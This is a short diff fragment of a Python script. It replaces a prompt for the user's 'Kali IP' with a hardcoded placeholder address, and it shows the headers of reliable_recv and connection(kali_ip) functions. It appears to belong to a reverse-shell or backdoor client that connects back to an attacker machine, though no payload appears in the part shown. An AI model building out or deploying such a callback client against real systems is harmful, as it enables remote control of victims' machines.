@@ -17,7 +17,7 @@ def reliable_recv():
         except ValueError:
             continue
 
-ip = str(input("Insert your Kali IP:\n"))
+ip = "xxx.xxx.xxx.xxx"
 
 def connection(kali_ip):
     while True:
